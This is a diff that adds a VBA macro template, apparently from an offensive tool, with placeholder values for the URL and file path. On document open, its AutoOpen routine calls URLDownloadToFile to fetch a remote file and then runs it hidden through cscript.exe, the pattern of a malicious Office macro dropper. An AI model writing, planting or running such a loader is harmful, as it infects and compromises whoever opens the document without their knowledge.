@@ -1,0 +1,18 @@
+Private Declare PtrSafe Function URLDownloadToFile Lib "urlmon" Alias "URLDownloadToFileA" (ByVal pCaller As Long, _
+    ByVal szURL As String, _
+    ByVal szFileName As String, _
+    ByVal dwReserved As Long, _
+    ByVal lpfnCB As Long) As Long
+
+Sub AutoOpen()
+
+    aVAR1a = "aPAYLOAD1a"
+    aVAR2a = "aPAYLOAD2a"
+
+    hResult = URLDownloadToFile(&H0, aVAR1a, aVAR2a, &H0, &H0)
+    
+    aVAR3a = "cscript.exe" & " " & aVAR2a
+    
+    Call Interaction$.Shell@(aVAR3a, vbHidden)
+
+End Sub
